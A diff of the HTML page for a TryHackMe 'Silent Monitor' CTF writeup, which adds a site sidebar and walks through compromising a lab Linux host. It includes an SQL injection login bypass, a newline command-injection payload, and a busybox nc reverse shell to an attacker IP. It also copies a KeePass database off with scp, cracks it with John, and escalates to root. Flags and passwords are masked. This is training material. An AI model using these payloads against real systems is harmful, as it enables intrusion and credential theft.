@@ -6,39 +6,177 @@
   <title>Silent Monitor — Writeup | OfflineDevc</title>
   <link rel="stylesheet" href="../style.css"/>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
 </head>
-<body>
-  <!-- NAV -->
+<body class="writeup-page">
+
+  <!-- TOP NAVBAR -->
   <nav class="navbar">
-    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
-    <div class="nav-links">
-      <a href="../index.html">Home</a>
-      <a href="../index.html#writeups">Writeups</a>
+    <div class="nav-inner">
+      <a href="../index.html" class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></a>
+      <div class="nav-links">
+        <a href="../index.html">Home</a>
+        <a href="../index.html#writeups">Writeups</a>
+        <a href="https://github.com/OfflineDevc" target="_blank" rel="noopener" class="nav-github-link">GitHub</a>
+      </div>
     </div>
   </nav>
 
-  <!-- WRITEUP HEADER -->
-  <section class="writeup-hero">
-    <div class="container">
-      <div class="writeup-meta-top">
-        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
-        <span class="platform-badge thm">TryHackMe</span>
+  <!-- WRITEUP HERO HEADER -->
+  <header class="writeup-hero">
+    <div class="writeup-hero-inner">
+      <div class="writeup-breadcrumb">
+        <a href="../index.html#writeups" class="back-link">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+          All Writeups
+        </a>
+        <span class="breadcrumb-slash">/</span>
+        <span class="breadcrumb-current">Silent Monitor</span>
       </div>
-      <h1 class="writeup-title">Silent Monitor</h1>
-      <div class="writeup-badges">
-        <span class="badge diff-hard">Hard</span>
-        <span class="badge badge-os">Linux</span>
+      <div class="writeup-header-content">
+        <h1 class="writeup-title">Silent Monitor</h1>
+        <div class="writeup-badges">
+          <span class="badge diff-hard">Hard</span>
+          <span class="badge badge-os">Linux</span>
+          <span class="badge badge-platform">TryHackMe</span>
+        </div>
       </div>
     </div>
-  </section>
+  </header>
 
-  <!-- WRITEUP CONTENT -->
-  <main class="writeup-body">
-    <div class="container writeup-content">
-<h1 id="silent-monitor-tryhackme-writeup">Silent Monitor - TryHackMe Writeup</h1>
-<hr />
-<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+  <!-- MOBILE SIDEBAR TOGGLE BAR -->
+  <div class="mobile-sidebar-bar">
+    <button class="mobile-sidebar-toggle" id="sidebarToggle" type="button">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      <span>Browse All Writeups</span>
+    </button>
+    <span class="mobile-current-title">Silent Monitor</span>
+  </div>
+
+  <!-- BACKDROP OVERLAY FOR MOBILE SIDEBAR -->
+  <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+  <!-- MAIN TWO-COLUMN LAYOUT -->
+  <div class="writeup-layout">
+    <aside class="writeup-sidebar" id="sidebar">
+  <div class="sidebar-header">
+    <span class="sidebar-label">WRITEUPS</span>
+    <span class="sidebar-count">11 ROOMS</span>
+  </div>
+  <nav class="sidebar-menu">
+    <div class="sidebar-group">
+      <div class="sidebar-group-header">
+        <span class="sidebar-group-name">EASY</span>
+        <span class="sidebar-group-badge pill-easy">1</span>
+      </div>
+      <ul class="sidebar-list">
+        <li class="sidebar-item">
+          <a href="skynet.html" class="sidebar-link" title="Skynet">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Skynet</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div class="sidebar-group">
+      <div class="sidebar-group-header">
+        <span class="sidebar-group-name">MEDIUM</span>
+        <span class="sidebar-group-badge pill-medium">4</span>
+      </div>
+      <ul class="sidebar-list">
+        <li class="sidebar-item">
+          <a href="deaddrop.html" class="sidebar-link" title="Deaddrop">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Deaddrop</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+        <li class="sidebar-item">
+          <a href="domino.html" class="sidebar-link" title="Domino">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Domino</span>
+            <span class="sidebar-os-tag">Win</span>
+          </a>
+        </li>
+        <li class="sidebar-item">
+          <a href="mrrobotctf.html" class="sidebar-link" title="Mr. Robot CTF">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Mr. Robot CTF</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+        <li class="sidebar-item">
+          <a href="relevant.html" class="sidebar-link" title="Relevant">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Relevant</span>
+            <span class="sidebar-os-tag">Win</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div class="sidebar-group">
+      <div class="sidebar-group-header">
+        <span class="sidebar-group-name">HARD</span>
+        <span class="sidebar-group-badge pill-hard">6</span>
+      </div>
+      <ul class="sidebar-list">
+        <li class="sidebar-item">
+          <a href="brainpan1.html" class="sidebar-link" title="Brainpan 1">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Brainpan 1</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+        <li class="sidebar-item">
+          <a href="daily-bugle.html" class="sidebar-link" title="Daily Bugle">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Daily Bugle</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+        <li class="sidebar-item">
+          <a href="forward.html" class="sidebar-link" title="Forward">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Forward</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+        <li class="sidebar-item">
+          <a href="internal.html" class="sidebar-link" title="Internal">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Internal</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+        <li class="sidebar-item">
+          <a href="retro.html" class="sidebar-link" title="Retro">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Retro</span>
+            <span class="sidebar-os-tag">Win</span>
+          </a>
+        </li>
+        <li class="sidebar-item active">
+          <a href="silent-monitor.html" class="sidebar-link" title="Silent Monitor">
+            <span class="sidebar-item-bullet"></span>
+            <span class="sidebar-item-title">Silent Monitor</span>
+            <span class="sidebar-os-tag">Lin</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </nav>
+  <div class="sidebar-footer">
+    <a href="../index.html#writeups" class="sidebar-home-link">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+      <span>All Writeups Grid</span>
+    </a>
+  </div>
+</aside>
+
+    <main class="writeup-main">
+      <article class="writeup-content">
+<h2>1. Executive Summary &amp; Machine Overview</h2>
 <table>
 <thead>
 <tr>
@@ -78,7 +216,7 @@
 </tbody>
 </table>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113191424.png" /></p>
-<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<h3>Attack Chain Summary</h3>
 <pre><code>Recon (Nmap)
   ↓
 Port 5050 — CorpNet NOC Portal v2.4.1 (Werkzeug/Python)
@@ -103,8 +241,8 @@ KeePassXC → root:********
 su root → root.txt
 </code></pre>
 <hr />
-<h2 id="2-phase-1-reconnaissance-enumeration">2. Phase 1: Reconnaissance &amp; Enumeration</h2>
-<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<h2>2. Phase 1: Reconnaissance &amp; Enumeration</h2>
+<h3>2.1 Port Scanning (Nmap)</h3>
 <pre><code class="language-bash">nmap -sV -sC 10.48.130.140 -Pn
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174324.png" /></p>
@@ -137,27 +275,27 @@ su root → root.txt
 <li>HTTP title: <strong>CorpNet Network Operations Centre</strong></li>
 <li>OS: Linux (<code>cpe:/o:linux:linux_kernel</code>)</li>
 </ul>
-<h3 id="22-web-application-enumeration">2.2 Web Application Enumeration</h3>
+<h3>2.2 Web Application Enumeration</h3>
 <p>Browsing <code>http://10.48.130.140:5050</code> reveals the <strong>CorpNet Network Operations Centre Portal</strong> — an infrastructure monitoring dashboard.</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174401.png" /></p>
 <p>The portal shows: 14 Monitored Hosts, 3 Open Alerts, 99.4% Uptime, 4 Network Segments. Version: <strong>NOC Portal v2.4.1</strong>.</p>
-<h3 id="23-directory-brute-forcing-gobuster">2.3 Directory Brute-Forcing (Gobuster)</h3>
+<h3>2.3 Directory Brute-Forcing (Gobuster)</h3>
 <pre><code class="language-bash">gobuster dir -u http://10.48.130.140:5050 -w /usr/share/wordlists/dirb/common.txt -t 15
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174334.png" /></p>
 <p><strong>Result:</strong> Found <code>/internal</code> (Status: 200, Size: 8770).</p>
-<h3 id="24-login-page-discovery">2.4 Login Page Discovery</h3>
+<h3>2.4 Login Page Discovery</h3>
 <p>Navigating to <code>http://10.48.130.140:5050/internal</code> reveals an <strong>Operator Access</strong> login form: "Sign In to NOC Portal".</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174419.png" /></p>
 <hr />
-<h2 id="3-phase-2-sql-injection-initial-foothold">3. Phase 2: SQL Injection &amp; Initial Foothold</h2>
-<h3 id="31-sql-injection-authentication-bypass">3.1 SQL Injection — Authentication Bypass</h3>
+<h2>3. Phase 2: SQL Injection &amp; Initial Foothold</h2>
+<h3>3.1 SQL Injection — Authentication Bypass</h3>
 <p>We test a classic SQL injection payload in the USERNAME field:</p>
 <pre><code>' or 1=1 -- -
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174435.png" /></p>
 <p><strong>Result:</strong> We bypass authentication and are logged in as the <strong><code>netops</code></strong> operator.</p>
-<h3 id="32-dashboard-exploration">3.2 Dashboard Exploration</h3>
+<h3>3.2 Dashboard Exploration</h3>
 <p>The authenticated dashboard at <code>/internal/dashboard</code> shows:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174446.png" /></p>
 <ul>
@@ -166,12 +304,12 @@ su root → root.txt
 <li><strong>Network Segments</strong>: Management (<code>10.0.0.0/24</code>), Server VLAN (<code>10.0.1.0/24</code>), DMZ (<code>10.0.2.0/24</code>), User VLAN (<code>10.0.10.0/23</code>), OOB Management (<code>192.168.100.0/24</code>)</li>
 <li><strong>Audit Log</strong>: Shows previous failed SQLi attempts (<code>' OR 1=1#</code>, <code>admin' --</code>), and valid operator logins (<code>netops</code>, <code>jmartin</code>)</li>
 </ul>
-<h3 id="33-host-health-check-command-injection-discovery">3.3 Host Health Check — Command Injection Discovery</h3>
+<h3>3.3 Host Health Check — Command Injection Discovery</h3>
 <p>The <strong>Host Health</strong> page (<code>/internal/health</code>) provides an ICMP Connectivity Probe feature:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174457.png" /></p>
 <p>First, we try injecting <code>127.0.0.1;whoami</code> directly in the web form:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174513.png" /></p>
-<h3 id="34-bypassing-client-side-validation-with-burp-suite">3.4 Bypassing Client-Side Validation with Burp Suite</h3>
+<h3>3.4 Bypassing Client-Side Validation with Burp Suite</h3>
 <p>We intercept the POST request to <code>/internal/health</code> in <strong>Burp Suite Community Edition v2026.3.2</strong>:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113174902.png" /></p>
 <p>The POST body parameter is <code>target=127.0.0.1</code>. We modify the request to inject a newline-based command injection:</p>
@@ -187,7 +325,7 @@ ping: 127.0.0.1
 : Name or service not known
 www-data
 </code></pre>
-<h3 id="35-reverse-shell-via-command-injection">3.5 Reverse Shell via Command Injection</h3>
+<h3>3.5 Reverse Shell via Command Injection</h3>
 <p>We craft a reverse shell payload in Burp Suite:</p>
 <pre><code>target=127.0.0.1
 busybox nc 192.168.132.94 4444 -e /bin/sh
@@ -201,7 +339,7 @@ busybox nc 192.168.132.94 4444 -e /bin/sh
 <strong>Connection received!</strong> We get a reverse shell as <code>www-data</code> on <code>tryhackme-2204</code> (<code>10.48.130.140</code>).</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113175137.png" /></p>
 <p>We land in <code>/opt/netops</code> as <code>www-data</code>.</p>
-<h3 id="36-credential-discovery-in-application-config">3.6 Credential Discovery in Application Config</h3>
+<h3>3.6 Credential Discovery in Application Config</h3>
 <p>Enumerating the application directory:</p>
 <pre><code class="language-bash">www-data@tryhackme-2204:/opt/netops$ ls
 app.py  netops.db  secret.config  templates
@@ -239,13 +377,13 @@ from = noc-alerts@corp.internal
 <p><strong>Credential Found:</strong> <code>sysadmin</code> : <code>********</code></p>
 </blockquote>
 <hr />
-<h2 id="4-phase-3-lateral-movement-ssh-as-sysadmin">4. Phase 3: Lateral Movement — SSH as sysadmin</h2>
-<h3 id="41-ssh-login">4.1 SSH Login</h3>
+<h2>4. Phase 3: Lateral Movement — SSH as sysadmin</h2>
+<h3>4.1 SSH Login</h3>
 <pre><code class="language-bash">ssh sysadmin@10.48.130.140
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113175650.png" /></p>
 <p>Successfully logged in as <code>sysadmin@tryhackme-2204</code>. System: Ubuntu 22.04.5 LTS, Kernel 6.8.0-1017-aws x86_64.</p>
-<h3 id="42-user-flag">4.2 User Flag</h3>
+<h3>4.2 User Flag</h3>
 <pre><code class="language-bash">sysadmin@tryhackme-2204:~$ ls
 backups  user.txt
 </code></pre>
@@ -258,8 +396,8 @@ THM{********************************}
 <p>🚩 <strong>User Flag:</strong> <code>THM{********************************}</code></p>
 </blockquote>
 <hr />
-<h2 id="5-phase-4-privilege-escalation-to-root">5. Phase 4: Privilege Escalation to Root</h2>
-<h3 id="51-keepass-database-discovery">5.1 KeePass Database Discovery</h3>
+<h2>5. Phase 4: Privilege Escalation to Root</h2>
+<h3>5.1 KeePass Database Discovery</h3>
 <p>Exploring the <code>backups</code> directory in <code>sysadmin</code>'s home:</p>
 <pre><code class="language-bash">sysadmin@tryhackme-2204:~/backups$ ls
 README.txt  infrastructure.kdbx
@@ -276,12 +414,12 @@ infrastructure.kdbx — KeePass credential database
 
 Contact the sysadmin team lead if you require access.
 </code></pre>
-<h3 id="52-exfiltrating-the-keepass-database">5.2 Exfiltrating the KeePass Database</h3>
+<h3>5.2 Exfiltrating the KeePass Database</h3>
 <p>We transfer <code>infrastructure.kdbx</code> to our attacker machine via SCP:</p>
 <pre><code class="language-bash">scp sysadmin@10.48.130.140:/home/sysadmin/backups/infrastructure.kdbx .
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113180322.png" /></p>
-<h3 id="53-cracking-the-keepass-master-password">5.3 Cracking the KeePass Master Password</h3>
+<h3>5.3 Cracking the KeePass Master Password</h3>
 <p>We open KeePassXC and see the database is locked:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113180338.png" /></p>
 <p>We extract the hash and crack it with <strong>John the Ripper</strong>:</p>
@@ -297,7 +435,7 @@ john kdbx.hash --show
 <blockquote>
 <p><strong>KeePass Master Password:</strong> <code>********</code></p>
 </blockquote>
-<h3 id="54-extracting-root-credentials-from-keepass">5.4 Extracting Root Credentials from KeePass</h3>
+<h3>5.4 Extracting Root Credentials from KeePass</h3>
 <p>Opening <code>infrastructure.kdbx</code> in KeePassXC with the master password:</p>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113180618.png" /></p>
 <p>The database contains an entry in the <code>backup</code> group:</p>
@@ -335,13 +473,13 @@ john kdbx.hash --show
 </tr>
 </tbody>
 </table>
-<h3 id="55-switching-to-root">5.5 Switching to Root</h3>
+<h3>5.5 Switching to Root</h3>
 <pre><code class="language-bash">sysadmin@tryhackme-2204:/var/log$ su root
 Password: ********
 root@tryhackme-2204:/var/log#
 </code></pre>
 <p><img alt="screenshot" src="../images/Pasted%20image%2020261113180646.png" /></p>
-<h3 id="56-root-flag">5.6 Root Flag</h3>
+<h3>5.6 Root Flag</h3>
 <pre><code class="language-bash">root@tryhackme-2204:~# cat root.txt
 THM{********************************}
 </code></pre>
@@ -350,7 +488,7 @@ THM{********************************}
 <p>🚩 <strong>Root Flag:</strong> <code>THM{********************************}</code></p>
 </blockquote>
 <hr />
-<h2 id="6-security-mitigations-remediation">6. Security Mitigations &amp; Remediation</h2>
+<h2>6. Security Mitigations &amp; Remediation</h2>
 <table>
 <thead>
 <tr>
@@ -393,7 +531,7 @@ THM{********************************}
 </tbody>
 </table>
 <hr />
-<h2 id="7-tools-used">7. Tools Used</h2>
+<h2>7. Tools Used</h2>
 <table>
 <thead>
 <tr>
@@ -440,15 +578,20 @@ THM{********************************}
 </tr>
 </tbody>
 </table>
-    </div>
-  </main>
+      </article>
+    </main>
+  </div>
 
   <!-- FOOTER -->
   <footer class="footer">
-    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
-       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
-       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
+    <div class="footer-inner">
+      <p class="footer-copy">Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+         <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+         <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a> · 
+         <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
+    </div>
   </footer>
+
   <script src="../script.js"></script>
 </body>
 </html>
